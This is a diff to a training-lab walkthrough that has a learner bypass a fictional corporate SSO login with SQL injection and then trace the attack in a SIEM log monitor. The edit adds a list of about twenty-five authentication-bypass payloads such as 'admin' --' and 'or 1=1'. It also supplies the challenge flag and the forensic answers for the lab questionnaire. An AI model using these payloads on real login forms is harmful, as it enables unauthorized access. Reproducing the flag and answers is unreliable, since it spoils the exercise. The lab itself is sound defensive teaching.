@@ -20,18 +20,50 @@
 
 ## Part 1: Quick Walkthrough - How to Perform the Lab
 
-### 1. Attack 1: SQL Injection (Login Bypass)
+### 1. Attack 1: SQL Injection (Login Bypass & Forensic IoC Analysis)
 1. In the top navigation, ensure you are in the **🌐 Web Application (portal.aegis-corp.com)** tab.
 2. Click **"Sign In"** in the top navigation bar to open the corporate Single Sign-On (SSO) login form (`/auth/login`).
-3. Inject a SQL boolean tautology or comment delimiter into either the Username or Password input field:
-   ```text
-   admin' --
-   ```
-   *(or enter `' OR '1'='1` in the password field)*
-4. Click **Sign In**. The vulnerable backend SQL query evaluates to `TRUE`, successfully authenticating you as Administrator and returning an **HTTP 302** redirect.
-5. The application navigates to the **🛡️ Admin Home Page & System Control Center**. Look inside the green **Administrative Secret Vault** card to retrieve the SQLi challenge flag:
+3. Inject any SQL injection authentication bypass payload into either the **Username** or **Password** input field:
+   - `admin' --`
+   - `admin' #`
+   - `admin'/*`
+   - `admin' or '1'='1`
+   - `admin' or '1'='1'--`
+   - `admin' or '1'='1'#`
+   - `admin' or '1'='1'/*`
+   - `admin' or 1=1 or ''='`
+   - `admin' or 1=1`
+   - `admin' or 1=1--`
+   - `admin' or 1=1#`
+   - `admin' or 1=1/*`
+   - `admin') or ('1'='1`
+   - `admin') or ('1'='1'--`
+   - `admin') or ('1'='1'#`
+   - `admin') or ('1'='1'/*`
+   - `admin') or '1'='1`
+   - `admin') or '1'='1'--`
+   - `admin') or '1'='1'#`
+   - `admin') or '1'='1'/*`
+   - `1' or '1' = '1`
+   - `or 1=1`
+   - `or 1=1--`
+   - `or 1=1#`
+   - `or 1=1/*`
+4. Click **Sign In**. The backend query evaluates to `TRUE`, bypassing authentication and returning an **HTTP 302** redirect.
+5. The application redirects to the **🛡️ Admin Home Page & System Control Center**. Look inside the green **Administrative Secret Vault** card to retrieve Flag #1:
    **`BLITZ{5ql1_byp455_4dm1n_h0m3_7d91a}`**
-6. Switch to the **🛡️ SOC SIEM Log Monitor** tab and filter by `uri:*login*` or `rule:RULE-SEC-002` to inspect the generated `POST /auth/login` request.
+6. **Find the IoC in the Web Application Log**: Switch to the **🛡️ SOC SIEM Log Monitor** tab.
+   - Filter by `uri:*login*` or `status:302` or `rule:RULE-SEC-002`.
+   - Locate the `POST /auth/login` request with status code `302`.
+   - Click **"Inspect Log"** to review the forensic details:
+     * **Request URI**: `/auth/login`
+     * **HTTP Method**: `POST`
+     * **Response Status**: `302 Found` (Redirection to Admin Home Page)
+     * **Payload Location**: `Request Body` (`username=admin' --&password=...`)
+     * **SIEM Detection Signature**: `RULE-SEC-002` (`SQL Injection - Authentication Bypass / Tautology Probe`)
+     * **Severity**: `CRITICAL`
+     * **Client IP**: `203.0.113.195`
+7. Paste these retrieved values into **Question 1, Question 2, and Question 3** of the questionnaire below.
 
 ---
 
